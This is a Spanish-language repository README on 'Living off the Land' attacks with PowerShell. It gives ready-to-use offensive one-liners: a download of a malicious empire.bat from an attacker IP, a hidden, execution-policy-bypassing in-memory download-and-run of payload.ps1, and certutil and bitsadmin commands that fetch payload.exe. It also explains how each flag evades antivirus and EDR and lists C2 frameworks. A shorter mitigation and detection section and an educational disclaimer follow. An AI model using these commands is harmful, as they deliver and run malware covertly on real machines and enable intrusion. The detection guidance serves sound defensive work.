# 🚀 Living off the Land (LotL) con PowerShell: Técnicas Avanzadas de Ataque

## 📌 Introducción
*"Living off the Land"* (LotL) es una técnica que consiste en **abusar de binarios y utilidades legítimas del sistema** (como PowerShell) para realizar ataques sin necesidad de instalar herramientas maliciosas. Esto permite evadir detecciones y operar en entornos comprometidos con mayor sigilo.

En este repositorio, exploramos **one-liners** reales usados en hacking ofensivo para:
✅ Descargar malware desde servidores remotos.
✅ Ejecutar código en memoria (*Fileless*).
✅ Integrar frameworks como **PowerShell Empire** para control post-explotación.

---

## 🔍 Técnicas Básicas de LotL con PowerShell

### 1️⃣ **Prueba de Conexión (Distracción)**
```powershell
Powershell -Command "Invoke-WebRequest 'https://ejemplo.com/hero-image.png' -OutFile matrix.png"
```

<img width="687" height="174" alt="image" src="https://github.com/user-attachments/assets/f0913fa4-5cc8-4db7-a6e5-1a7d68b1864e" />

🔹 **Propósito**:
- Verificar si la máquina tiene salida a internet.
- "Limpiar" el historial con una descarga aparentemente inofensiva (ej: imagen).
- Evitar sospechas en entornos con monitoreo básico.

🔹 **Detalle**:
- Usa `Invoke-WebRequest` (alias `iwr`) para descargar un archivo legítimo.
- El nombre del archivo (`matrix.png`) sugiere una acción benigna.

---

### 2️⃣ **Descarga de Payload Malicioso**
```powershell
Powershell -Command "Invoke-WebRequest 'http://172.16.74.12/empire.bat' -OutFile empire.bat"
```
🔹 **Propósito**:
- Descargar un **script malicioso** (`.bat`) desde un servidor controlado por el atacante (ej: `172.16.74.12`).
- El nombre `empire.bat` indica el uso de **PowerShell Empire**, un framework C2 (Command & Control) para persistencia y post-explotación.

🔹 **Detalle**:
- El atacante aloja el payload en un servidor local (IP privada) para evitar filtros de red.
- El archivo `.bat` puede contener comandos para establecer persistencia, exfiltrar datos o descargar más malware.

---

## 🚀 Nivel Élite: Técnicas *Fileless* y Ofuscación

En ataques avanzados, los profesionales **evitan dejar rastros en disco** y ejecutan código directamente en memoria. Aquí el ejemplo definitivo:

```powershell
# Versión Élite: Descarga y ejecución en memoria (sin tocar el disco)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://172.16.74.12/payload.ps1')"
```
🔹 **¿Por qué es "Élite"?**
| Técnica               | Descripción                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| `-NoP` (NoProfile)    | Omite la carga del perfil de usuario, acelerando la ejecución y reduciendo logs. |
| `-NonI`               | No interactúa con la consola (evita ventanas emergentes).                  |
| `-W Hidden`           | Ejecución en segundo plano (sin interfaz gráfica).                        |
| `-Exec Bypass`        | Omite políticas de ejecución restrictivas (ej: `Restricted`).              |
| `IEX` (Invoke-Expression) | Ejecuta el código descargado **directamente en memoria RAM**.               |

🔹 **Ventajas**:
- **Evasión de AV/EDR**: Al no escribir en disco, esquiva escáneres que monitorean archivos.
- **Persistencia**: El código en memoria puede persistir mediante técnicas como **reflection injection** o **DLL hijacking**.
- **Ofuscación**: El payload (`payload.ps1`) puede estar ofuscado para evitar detección estática.

---

## 🛡️ Mitigación y Detección

### 🔎 **Señales de Alerta**
- Uso de `Invoke-WebRequest` o `Invoke-Expression` en scripts no autorizados.
- Descargas desde IPs desconocidas o dominios no confiables.
- Ejecución de comandos con `-NoP`, `-NonI`, o `-W Hidden`.
- Conexiones a servidores C2 (ej: `172.16.74.12`) desde hosts internos.

### 🛠️ **Controles Recomendados**
1. **Restringir PowerShell**:
   - Configurar **Constrained Language Mode** para limitar comandos peligrosos.
   - Usar **AppLocker** o **WDAC** para bloquear scripts no firmados.
2. **Monitoreo**:
   - Registrar eventos de `Process Creation` con **Sysmon** (ej: `Image` = `powershell.exe`).
   - Alertar sobre conexiones a IPs sospechosas (ej: `172.16.x.x`).
3. **Educación**:
   - Capacitar a equipos de TI/seguridad sobre técnicas **LotL**.
   - Simular ataques con herramientas como **Atomic Red Team**.

---

## 📜 Sección del README.md: "Payload Delivery & Living off the Land"


## 💉 XI. Payload Delivery & Living off the Land (LotL)

Técnicas de transferencia de archivos y ejecución de código mediante utilidades nativas del sistema.

### 🎯 Vectores de Ataque
- **Abuso de `Invoke-WebRequest`**:
  - Descarga de archivos maliciosos (ej: `.bat`, `.ps1`).
  - Exfiltración de datos mediante canales legítimos.
- **Técnicas *Fileless***:
  - Ejecución en memoria con `IEX` o `Start-BitsTransfer`.
  - Persistencia mediante inyección de DLLs o scripts en memoria.

### 🛡️ Evasión y Ofuscación
| Técnica               | Descripción                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| **PowerShell Obfuscation** | Codificación en Base64, sustitución de caracteres, o uso de `Invoke-Obfuscation`. |
| **Fileless Execution**     | Código ejecutado directamente en RAM (ej: `IEX (New-Object Net.WebClient).DownloadString`). |
| **Living off the Land Binaries (LOLBins)** | Uso de herramientas como `certutil`, `bitsadmin`, o `mshta` para descargas encubiertas. |

### 🔧 Herramientas y Frameworks
- **C2 Frameworks**:
  - [PowerShell Empire](https://github.com/BC-SECURITY/Empire)
  - [Cobalt Strike](https://www.cobaltstrike.com/) (Beacon + PowerShell)
  - [Sliver](https://github.com/BishopFox/sliver) (Post-explotación moderna)
- **LOLBins Comunes**:
  - `certutil -urlcache -split -f http://malicious.url payload.exe`
  - `bitsadmin /transfer myJob /download /priority normal http://malicious.url payload.exe C:\Windows\Temp\payload.exe`

### ⚠️ Advertencia
⚠️ **Este repositorio es para fines educativos y de investigación.**
🔐 **Solo debe usarse en entornos controlados (ej: laboratorios de pentesting con autorización).**
🚫 **El uso malintencionado de estas técnicas es ilegal y puede acarrear consecuencias legales.**



---
📌 **Nota Final**:
Las técnicas *LotL* son **poderosas pero peligrosas**. Su detección requiere un enfoque en **comportamiento anómalo** (ej: procesos que usan `powershell.exe` para descargar archivos) más que en firmas estáticas. ¡Mantente siempre un paso adelante! 🛡️
